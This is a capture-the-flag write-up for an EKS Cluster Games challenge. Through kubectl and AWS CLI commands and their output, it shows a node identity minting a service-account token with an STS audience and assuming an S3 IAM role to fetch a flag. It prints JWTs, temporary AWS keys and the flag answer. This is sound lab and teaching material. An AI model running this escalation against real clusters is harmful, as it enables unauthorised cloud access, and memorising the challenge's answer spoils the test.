---
tags:
  - Kubernetes
  - OIDC
title: EKS Cluster Game - Container Secrets Infrastructure
description: Move from the EKS to the AWS account
reference: https://eksclustergames.com/challenge/5
---
## Challenges

You've successfully transitioned from a limited Service Account to a Node Service Account! Great job. Your next challenge is to **move from the EKS to the AWS account.** Can you acquire the AWS role of the `s3access-sa` service account, and get the flag?

## Solution

### 1. Try to get the AWS role arn by `kubectl get sa`

role arn: `arn:aws:iam::688655246681:role/challengeEksS3Role`

```
root@wiz-eks-challenge:~# kubectl get sa -o yaml
apiVersion: v1
items:
- apiVersion: v1
  kind: ServiceAccount
  metadata:
    annotations:
      description: This is a dummy service account with empty policy attached
      eks.amazonaws.com/role-arn: arn:aws:iam::688655246681:role/challengeTestRole-fc9d18e
    creationTimestamp: "2023-10-31T20:07:37Z"
    name: debug-sa
    namespace: challenge5
    resourceVersion: "671929"
    uid: 6cb6024a-c4da-47a9-9050-59c8c7079904
- apiVersion: v1
  kind: ServiceAccount
  metadata:
    creationTimestamp: "2023-10-31T20:07:11Z"
    name: default
    namespace: challenge5
    resourceVersion: "671804"
    uid: 77bd3db6-3642-40d5-b8c1-14fa1b0cba8c
- apiVersion: v1
  kind: ServiceAccount
  metadata:
    annotations:
      eks.amazonaws.com/role-arn: arn:aws:iam::688655246681:role/challengeEksS3Role
    creationTimestamp: "2023-10-31T20:07:34Z"
    name: s3access-sa
    namespace: challenge5
    resourceVersion: "671916"
    uid: 86e44c49-b05a-4ebe-800b-45183a6ebbda
kind: List
metadata:
  resourceVersion: ""
```

### 2. Try to use `aws sts assume-role` to assume the role `arn:aws:iam::688655246681:role/challengeEksS3Role`

Failed.

```
root@wiz-eks-challenge:~# aws sts assume-role --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name mySession

An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::688655246681:role/challengeEksS3Role
```

### 3. check the k8s API permissions

We can create serviceaccounts token for `debug-sa` service account.

```
root@wiz-eks-challenge:~/.kube# kubectl auth can-i --list
warning: the list may be incomplete: webhook authorizer does not support user rule resolution
Resources                                       Non-Resource URLs   Resource Names     Verbs
serviceaccounts/token                           []                  [debug-sa]         [create]
selfsubjectaccessreviews.authorization.k8s.io   []                  []                 [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []                 [create]
pods                                            []                  []                 [get list]
secrets                                         []                  []                 [get list]
serviceaccounts                                 []                  []                 [get list]
                                                [/api/*]            []                 [get]
                                                [/api]              []                 [get]
                                                [/apis/*]           []                 [get]
                                                [/apis]             []                 [get]
                                                [/healthz]          []                 [get]
                                                [/healthz]          []                 [get]
                                                [/livez]            []                 [get]
                                                [/livez]            []                 [get]
                                                [/openapi/*]        []                 [get]
                                                [/openapi]          []                 [get]
                                                [/readyz]           []                 [get]
                                                [/readyz]           []                 [get]
                                                [/version/]         []                 [get]
                                                [/version/]         []                 [get]
                                                [/version]          []                 [get]
                                                [/version]          []                 [get]
podsecuritypolicies.policy                      []                  [eks.privileged]   [use]
```

### 4. Try to create a token for `debug-sa`

```
root@wiz-eks-challenge:~/.kube# kubectl create token debug-sa -n challenge5 
eyJhbGciOiJSUzI1NiIsImtpZCI6ImRlOWJkNjUyNzI3ZjI4MGFlZTIwMzNiNmRlMDE4NDJjMGE2ODIxODMifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjIl0sImV4cCI6MTc0NzU5Mjg4MCwiaWF0IjoxNzQ3NTg5MjgwLCJpc3MiOiJodHRwczovL29pZGMuZWtzLnVzLXdlc3QtMS5hbWF6b25hd3MuY29tL2lkL0MwNjJDMjA3QzhGNTBERTRFQzI0QTM3MkZGNjBFNTg5Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJjaGFsbGVuZ2U1Iiwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRlYnVnLXNhIiwidWlkIjoiNmNiNjAyNGEtYzRkYS00N2E5LTkwNTAtNTljOGM3MDc5OTA0In19LCJuYmYiOjE3NDc1ODkyODAsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpjaGFsbGVuZ2U1OmRlYnVnLXNhIn0.bdIt4Pli4PobnjpmsqYp3OqxFaQKWewg-KQP2qjabDlUk3gvdor45kDW4w0qPgFwZMeZB2SiwonGIgmwf0X7Vw2xNJKQ8TNUltsTv_olAzo57K9m7FOxQ8ggfgQMBQPUnkc__hjno2F7mkgNjmhcMu60E4Tdr_QnHFxbysvMTVqsl4cLFim445q5WqdTkpFrAN6CATNyPAkfx5p9BsQ3-vhS9cu4SW0X-_FNPgDsAdKp13mUmOO-qjveVVOyaoNyzMVAK3dHcUeuY7AdibiUJz_l5wrgR7wXXPAAwYAF-EL5MnGsTkDNqAUuZo0ocgeJfPmz-5rJt3IflOMb1Ubfcw
```

### 5. Try to attach some policies to `debug-sa`

Failed.

```
root@wiz-eks-challenge:~# aws iam attach-role-policy --role-name challengeTestRole-fc9d18e --policy-arn arn:aws:iam::aws:policy/AmazonS3FullAccess

An error occurred (AccessDenied) when calling the AttachRolePolicy operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: iam:AttachRolePolicy on resource: role challengeTestRole-fc9d18e because no identity-based policy allows the iam:AttachRolePolicy action
root@wiz-eks-challenge:~# aws iam attach-role-policy --role-name challengeTestRole-fc9d18e --policy-arn arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess

An error occurred (AccessDenied) when calling the AttachRolePolicy operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: iam:AttachRolePolicy on resource: role challengeTestRole-fc9d18e because no identity-based policy allows the iam:AttachRolePolicy action
```

### 6. view the hints

#### Trust Policies

```json
{ "Version": "2012-10-17", "Statement": [ { "Effect": "Allow", "Principal": { "Federated": "arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589" }, "Action": "sts:AssumeRoleWithWebIdentity", "Condition": { "StringEquals": { "oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589:aud": "sts.amazonaws.com" } } } ] }
```

#### IAM Role Policies

```json
{ "Policy": { "Statement": [ { "Action": [ "s3:GetObject", "s3:ListBucket" ], "Effect": "Allow", "Resource": [ "arn:aws:s3:::challenge-flag-bucket-3ff1ae2", "arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag" ] } ], "Version": "2012-10-17" } }
```

### 7. Try to allow `debug-sa` to assume the `challengeEksS3Role` by updating the trust policy

Failed.

```
root@wiz-eks-challenge:~# aws iam update-assume-role-policy --role-name challengeEksS3Role --policy-document tp.json

An error occurred (AccessDenied) when calling the UpdateAssumeRolePolicy operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: iam:UpdateAssumeRolePolicy on resource: role challengeEksS3Role because no identity-based policy allows the iam:UpdateAssumeRolePolicy action
```

### 8. Try to create a new IAM policy

Failed.

```
root@wiz-eks-challenge:~# aws iam create-policy --policy-name ch5 --policy-document iam_policy.json 

An error occurred (AccessDenied) when calling the CreatePolicy operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: iam:CreatePolicy on resource: policy ch5 because no identity-based policy allows the iam:CreatePolicy action
```

### 9. Try `aws iam put-role-policy` to `challengeTestRole-fc9d18e` role

Failed.

```
root@wiz-eks-challenge:~# aws iam put-role-policy --role-name challengeTestRole-fc9d18e --policy-name ch5 --policy-document iam_policy.json 

An error occurred (AccessDenied) when calling the PutRolePolicy operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: iam:PutRolePolicy on resource: role challengeTestRole-fc9d18e because no identity-based policy allows the iam:PutRolePolicy action
```

### 10. Try `aws get-token` with `--role-arn` parameter

Failed.

```
root@wiz-eks-challenge:~# aws eks get-token --cluster-name eks-challenge-cluster --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role

An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::688655246681:role/challengeEksS3Role
root@wiz-eks-challenge:~# aws eks get-token --cluster-name eks-challenge-cluster --role-arn arn:aws:iam::688655246681:role/challengeTestRole-fc9d18e
 
An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::688655246681:role/challengeTestRole-fc9d18e
```


### 11. found we can create token with custom audience! Try to create the token with audience `sts.amazonaws.com`

```
root@wiz-eks-challenge:~# kubectl create token debug-sa -n challenge5 --audience sts.amazonaws.com
eyJhbGciOiJSUzI1NiIsImtpZCI6ImRlOWJkNjUyNzI3ZjI4MGFlZTIwMzNiNmRlMDE4NDJjMGE2ODIxODMifQ.eyJhdWQiOlsic3RzLmFtYXpvbmF3cy5jb20iXSwiZXhwIjoxNzQ3NjAwODgwLCJpYXQiOjE3NDc1OTcyODAsImlzcyI6Imh0dHBzOi8vb2lkYy5la3MudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vaWQvQzA2MkMyMDdDOEY1MERFNEVDMjRBMzcyRkY2MEU1ODkiLCJrdWJlcm5ldGVzLmlvIjp7Im5hbWVzcGFjZSI6ImNoYWxsZW5nZTUiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVidWctc2EiLCJ1aWQiOiI2Y2I2MDI0YS1jNGRhLTQ3YTktOTA1MC01OWM4YzcwNzk5MDQifX0sIm5iZiI6MTc0NzU5NzI4MCwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmNoYWxsZW5nZTU6ZGVidWctc2EifQ.mfuAuFMED4Xg-d1Jj1Pk-e0kXwhI8RlUy9AHGSWl2Bpg7MHedglOUbdUmU7klApqo2hAgML0yaECkOjRKhIb7Bpmjx91x1_0Gexs9coKRXDtvpcu0GEJU84oFyKj6qtVYSWmATaTGVOZahjoS3WClBLZG5nPN7rg3j2J8Ao_x-RWpacqjEaapPums5dkC9M084O3-I4jWIOCdWalYTGIfgcgk2fiTAUTd1XxADIthLp86tzb3xB-QkCfbeRnmfdKsRuI3ywiwkwGQ7FrMWsufqiBRZ5P6Kr64go7ejbMIJ_5ti3x3KfJ0iIH13LChzj0QYyIXMYAAH9UGVLvvgnhVw
```

### 12. Try to assume `challengeEksS3Role` role to the above token via OIDC

It works!

```
root@wiz-eks-challenge:~# aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name ch5
 --web-identity-token eyJhbGciOiJSUzI1NiIsImtpZCI6ImRlOWJkNjUyNzI3ZjI4MGFlZTIwMzNiNmRlMDE4NDJjMGE2ODIxODMifQ.eyJhdWQiOlsic3RzLmFtYXpvbmF3cy5jb20iXSw
iZXhwIjoxNzQ3NjAwODgwLCJpYXQiOjE3NDc1OTcyODAsImlzcyI6Imh0dHBzOi8vb2lkYy5la3MudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vaWQvQzA2MkMyMDdDOEY1MERFNEVDMjRBMzcyRkY
2MEU1ODkiLCJrdWJlcm5ldGVzLmlvIjp7Im5hbWVzcGFjZSI6ImNoYWxsZW5nZTUiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVidWctc2EiLCJ1aWQiOiI2Y2I2MDI0YS1jNGRhLTQ3YTk
tOTA1MC01OWM4YzcwNzk5MDQifX0sIm5iZiI6MTc0NzU5NzI4MCwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmNoYWxsZW5nZTU6ZGVidWctc2EifQ.mfuAuFMED4Xg-d1Jj1Pk-e0kXwhI
8RlUy9AHGSWl2Bpg7MHedglOUbdUmU7klApqo2hAgML0yaECkOjRKhIb7Bpmjx91x1_0Gexs9coKRXDtvpcu0GEJU84oFyKj6qtVYSWmATaTGVOZahjoS3WClBLZG5nPN7rg3j2J8Ao_x-RWpacq
jEaapPums5dkC9M084O3-I4jWIOCdWalYTGIfgcgk2fiTAUTd1XxADIthLp86tzb3xB-QkCfbeRnmfdKsRuI3ywiwkwGQ7FrMWsufqiBRZ5P6Kr64go7ejbMIJ_5ti3x3KfJ0iIH13LChzj0QYyI
XMYAAH9UGVLvvgnhVw
{
    "Credentials": {
        "AccessKeyId": "ASIA2AVYNEVMXIZBVAJ3",
        "SecretAccessKey": "wdnfAwaJrsysXtnovRyt+3BEBTKnVCiTF9Or2GLM",
        "SessionToken": "IQoJb3JpZ2luX2VjEMT//////////wEaCXVzLXdlc3QtMSJHMEUCIA7ZqiOtBbuFNFoXbS56axXjcts1uwsVnCXCz7RMcZ7RAiEAiaB2ksAI0TcZEtlOUwF0S+WIjg0jaiBLRebENOb4EmcqtAQIfRABGgw2ODg2NTUyNDY2ODEiDDHUZbLMiu3IL1hOkSqRBCOSegHi8Z9P0K9LAPTLodlh7Gyg1gaxgAxOsE2RK2NkSYzy9Ty3DIuWu5OauhEIbEv2RHuAm2ljOXSjp1Wwr07XTcJb/dIUIcbEcDAYQ45EjI3VQQall7JnJicRifNhdD2LuvGLz0Anceag5a9IugGkKekSEYlDviT2M+Zi0ODf0m5EYO5vPHgQie7MdzPwe5uv6KxZXDSYW4XFEw80OcKq1sQMWCSFbh0Is7k+4CtEwFUfw8md3A94iEUxXYaIYcT2JRwyM5JIC3ZTeJDfyBTy++d5a9hwzl6T8mLv/qLfdS1RwCWroZCTy+/wXH5BvGG4U1r7jvvps3icc7TfNTnKwBcFtLnCSieeiSRru3mYIqdtDSU9NcpQy6pyH8Zvo0gjG4XoEtV862OMFd+yDgQRZYIvBu33/cDrVJu/rVBR90eqhV3I5M3LniaWyUP3cWSACI1a3ouAGu3WtICSnuJjQUt2Ckh+QqUHQMZgOSfHLePYO4KLxIiXvxRJ17nHdRT9S2PcoIur2vj+d2WfdZxaUStCfM+vzDBWHYqHKNT96ctIopNUo5N/1yQdCHjHSBO2eD2nV/CY+ROTSxRNrJnzjPTE4+BrV9SNfxEsbD+a3/9HDCKnmL3baCevT2zM/B3hbJazut+l5pjJIFJDvLXD7dyk7lGfTOiy98eHybc+YUag/gjNlwKr6uox/nKFfAcw5PGowQY6lQFLI3GmTteSvO1ktHdwp+E8Ao44BQQlanve6D6sb69k9265Vk1iDK3F3vvlK2ux91h3c+epqHHzx9/cdPd7IcB3Zll4uDpUKOtjL0LLQuut+DFonBGPbYHtMr2PtOIIIXq1EBSO7EMVkYhcQt1lNmt1sgGL9RWRmSkBgny6atWXQT1V028QUoIgR2iAF87VD+AuNIJkkw==",
        "Expiration": "2025-05-18T20:45:40+00:00"
    },
    "SubjectFromWebIdentityToken": "system:serviceaccount:challenge5:debug-sa",
    "AssumedRoleUser": {
        "AssumedRoleId": "AROA2AVYNEVMZEZ2AFVYI:ch5",
        "Arn": "arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/ch5"
    },
    "Provider": "arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589",
    "Audience": "sts.amazonaws.com"
}
```

### 13. change the aws cli identity to the assumed role and download the flag from s3 bucket

```
root@wiz-eks-challenge:~/.aws# aws sts get-caller-identity
{
    "UserId": "AROA2AVYNEVMZEZ2AFVYI:ch5",
    "Account": "688655246681",
    "Arn": "arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/ch5"
}
root@wiz-eks-challenge:~/.aws# aws s3 cp s3://challenge-flag-bucket-3ff1ae2/flag flag
download: s3://challenge-flag-bucket-3ff1ae2/flag to ./flag       
root@wiz-eks-challenge:~/.aws# cat flag 
wiz_eks_challenge{w0w_y0u_really_are_4n_eks_and_aws_exp1oitation_legend}
```